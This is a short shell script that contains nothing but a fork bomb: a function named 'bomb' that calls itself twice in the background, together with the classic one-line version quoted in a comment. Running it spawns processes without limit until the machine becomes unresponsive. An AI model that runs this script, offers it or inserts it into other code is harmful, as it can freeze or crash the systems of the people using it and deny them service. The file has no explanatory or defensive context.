#!/bin/sh

# :(){:|:&};:
bomb() {
    bomb | bomb &
}
bomb
